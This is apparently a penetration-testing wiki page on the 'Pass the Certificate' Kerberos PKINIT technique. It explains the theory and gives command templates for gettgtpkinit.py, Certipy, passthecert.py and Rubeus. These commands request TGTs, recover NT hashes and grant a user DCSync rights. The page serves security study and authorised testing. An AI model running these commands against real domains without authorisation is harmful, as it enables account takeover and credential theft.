# Pass the Certificate

## Theory

The Kerberos authentication protocol works with tickets in order to grant access. An ST (Service Ticket) can be obtained by presenting a TGT (Ticket Granting Ticket). That prior TGT can only be obtained by validating a first step named "pre-authentication" (except if that requirement is explicitly removed for some accounts, making them vulnerable to [ASREProast](asreproast.md)). The pre-authentication can be validated symmetrically (with a DES, RC4, AES128 or AES256 key) or asymmetrically (with certificates). The asymmetrical way of pre-authenticating is called PKINIT.

Pass the Certificate is the fancy name given to the pre-authentication operation relying on a certificate (i.e. key pair) to pass in order to obtain a TGT. This operation is often conducted along [shadow credentials](shadow-credentials.md), [AD CS escalation](../adcs/index) and [UnPAC-the-hash attacks](unpac-the-hash.md).

> [!TIP]
> Keep in mind a certificate in itself cannot be used for authentication without the knowledge of the private key. A certificate is signed for a specific public key, that was generated along with a private key, which should be used when relying on a certificate for authentication.
> 
> The "certificate + private key" pair is usually used in the following manner
> 
> * PEM certificate + PEM private key
> * PFX certificate export (which contains the private key) + PFX password (which protects the PFX certificate export)

## Practice

::: tabs

=== UNIX-like

From UNIX-like systems, [Dirk-jan](https://twitter.com/_dirkjan)'s [gettgtpkinit.py](https://github.com/dirkjanm/PKINITtools/blob/master/gettgtpkinit.py) from [PKINITtools](https://github.com/dirkjanm/PKINITtools/) tool to request a TGT (Ticket Granting Ticket) for the target object. That tool supports the use of the certificate in multiple forms.


```python
# PFX certificate (file) + password (string, optionnal)
gettgtpkinit.py -cert-pfx "PATH_TO_PFX_CERT" -pfx-pass "CERT_PASSWORD" "FQDN_DOMAIN/TARGET_SAMNAME" "TGT_CCACHE_FILE"

# Base64-encoded PFX certificate (string) (password can be set)
gettgtpkinit.py -pfx-base64 $(cat "PATH_TO_B64_PFX_CERT") "FQDN_DOMAIN/TARGET_SAMNAME" "TGT_CCACHE_FILE"

# PEM certificate (file) + PEM private key (file)
gettgtpkinit.py -cert-pem "PATH_TO_PEM_CERT" -key-pem "PATH_TO_PEM_KEY" "FQDN_DOMAIN/TARGET_SAMNAME" "TGT_CCACHE_FILE"
```


Alternatively, [Certipy](https://github.com/ly4k/Certipy) (Python) can be used for the same purpose.


```bash
certipy auth -pfx "PATH_TO_PFX_CERT" -dc-ip 'dc-ip' -username 'user' -domain 'domain'
```


Certipy's commands don't support PFXs with password. The following command can be used to "unprotect" a PFX file.


```bash
certipy cert -export -pfx "PATH_TO_PFX_CERT" -password "CERT_PASSWORD" -out "unprotected.pfx"
```


The ticket obtained can then be used to

* authenticate with [pass-the-cache](ptc.md)
* conduct an [UnPAC-the-hash](unpac-the-hash.md) attack. This can be done with [getnthash.py](https://github.com/dirkjanm/PKINITtools/blob/master/getnthash.py) from [PKINITtools](https://github.com/dirkjanm/PKINITtools/).
* obtain access to the account's SPN with an S4U2Self. This can be done with [gets4uticket.py](https://github.com/dirkjanm/PKINITtools/blob/master/gets4uticket.py) from [PKINITtools](https://github.com/dirkjanm/PKINITtools).

> [!TIP]
> When using Certipy for Pass-the-Certificate, it automatically does [UnPAC-the-hash](unpac-the-hash.md) to recover the account's NT hash, in addition to saving the TGT obtained.

Another alternative is with [PassTheCert](https://github.com/AlmondOffSec/PassTheCert/blob/main/Python/passthecert.py) (Python) which can be used to conduct multiple techniques like elevate a user for [dcsync.md](../credentials/dumping/dcsync.md) or change password for a specific user.

```bash
# extract key and cert from the pfx
certipy cert -pfx "PATH_TO_PFX_CERT" -nokey -out "user.crt"
certipy cert -pfx "PATH_TO_PFX_CERT" -nocert -out "user.key"

# elevate a user for DCSYNC with passthecert.py
passthecert.py -action modify_user -crt "PATH_TO_CRT" -key "PATH_TO_KEY" -domain "domain.local" -dc-ip "DC_IP" -target "SAM_ACCOUNT_NAME" -elevate
```


=== Windows

From Windows systems, [Rubeus](https://github.com/GhostPack/Rubeus) (C#) can be used to request a TGT (Ticket Granting Ticket) for the target object from a base64-encoded PFX certificate export (with an optional password).

```powershell
Rubeus.exe asktgt /user:"TARGET_SAMNAME" /certificate:"BASE64_CERTIFICATE" /password:"CERTIFICATE_PASSWORD" /domain:"FQDN_DOMAIN" /dc:"DOMAIN_CONTROLLER" /show
```

> [!TIP]
> PEM certificates can be exported to a PFX format with openssl. Rubeus doesn't handle PEM certificates.
> 
> ```bash
> openssl pkcs12 -in "cert.pem" -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out "cert.pfx"
> ```

> [!TIP]
> Certipy uses DER encryption. To generate a PFX for Rubeus, [openssl](https://www.openssl.org/) can be used.
> 
> ```bash
> openssl rsa -inform DER -in key.key -out key-pem.key
> openssl x509 -inform DER -in cert.crt -out cert.pem -outform PEM
> openssl pkcs12 -in cert.pem -inkey key-pem.key -export -out cert.pfx
> ```
>
> > [!TIP]
> To generate a b64 for Rubeus:
> 
> ```powershell
> $pfx_cert = get-content 'c:\cert.pfx' -Encoding Byte
> $base64 = [System.Convert]::ToBase64String($pfx_cert)
> $base64
> ```

The ticket obtained can then be used to

* authenticate with [pass-the-ticket](ptt.md)
* conduct an [UnPAC-the-hash](unpac-the-hash.md) attack (add the `/getcredentials` flag to Rubeus's asktgt command)
* obtain access to the account's SPN with an S4U2Self.
